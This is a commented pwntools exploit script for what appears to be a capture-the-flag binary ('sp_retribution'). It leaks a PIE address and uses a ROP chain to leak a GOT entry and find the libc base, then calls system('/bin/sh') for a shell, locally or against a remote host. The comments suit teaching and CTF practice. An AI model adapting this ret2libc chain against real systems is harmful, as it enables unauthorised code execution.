# PIE bypass and ret2libc challenge

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
break missile_launcher
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './sp_retribution'
libc = ELF('./glibc/libc.so.6')
# pwntools will get the context arch, bits, os and other useful parameters
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP, find manually with gdb
offset = 88

# Start program
io = start()

pop_rdi_offset = 0xd33

# After ">> ", we send a 2 to navigate to the missile launch part of the program
io.sendlineafter(b'>> ', b'2')

# For the first input prompt we send 8 B's (could be any value)
io.send(b'B'*8)

# We receive until the line which lets the user know "new coordinates" and the line ends with the user input
io.recvuntil(b'B'*8)

# After that line, that's where the memory leak is occuring. So we will receive the data up until we reach a newline, where it's going to be dropped
# https://docs.pwntools.com/en/stable/tubes.html?highlight=recvuntil#pwnlib.tubes.tube.tube.recvuntil
leak = io.recvuntil(b'\n', drop=True)
print(leak)

# Because the memory leak received is 6 bytes, we use "ljust" method to return an 8 byte value of leak, filling the 2 bytes with \x00
# https://www.w3schools.com/python/ref_string_ljust.asp If not specified the default would be a space
# Lastly the value will be unpacked as a 64bit integer
leak_address = u64(leak.ljust(8, b'\x00'))

# Update the beginning of the binary to be the leaked memory address - the static offset
elf.address = u64(leak.ljust(8, b'\x00')) - 0xd70 

# Print the data to the user
info("Leaked address:%#x",leak_address)
info("Pie base:%#x", elf.address)


# Update pop_rdi gadget with the base address of the binary
pop_rdi = elf.address + pop_rdi_offset



# Payload to leak libc function
payload = flat({
    offset: [
        pop_rdi,  # Pop got.read into RDI
        elf.got.read,
        elf.plt.puts,  # Call puts() to leak the got.read address. Used to leak the address of the function from the GOT
        elf.symbols.missile_launcher  # Return to missile launcher (to overflow buffer with another payload)
    ]
})


# Send the payload
io.sendlineafter(b'(y/n): ', payload)

# Read the leaked address. This can be seen in debug data received that the value ends in 34m\n
io.recvuntil(b'34m\n')

# Retrieve got.read address
got_read = u64(io.recv()[:6].ljust(8, b"\x00"))
info("leaked got_read: %#x", got_read)


# Subtract puts offset to get libc base
# readelf -s ./glibc/libc.so.6 | grep read       (From "challenge" directory)
libc_base = got_read - 0xf7350
info("libc_base: %#x", libc_base)

# Add offsets to get system() and "/bin/sh" addresses
# readelf -s ./glibc/libc.so.6 | grep system      (From "challenge" directory)
system_addr = libc_base + 0x453a0
info("system_addr: %#x", system_addr)

# strings -a -t x ./glibc/libc.so.6 | grep /bin/sh
bin_sh = libc_base + 0x18ce57
info("bin_sh: %#x", bin_sh)

# Payload to get shell: system('/bin/sh')
payload = flat({
    offset: [
        pop_rdi,
        bin_sh,
        system_addr
    ]
})

# Run the process of missile_launcher again. To get to the buffer overflow
io.send(b'B'*8)

# Send the payload
io.sendlineafter(b': ',payload)

# Get Shell?
io.interactive()
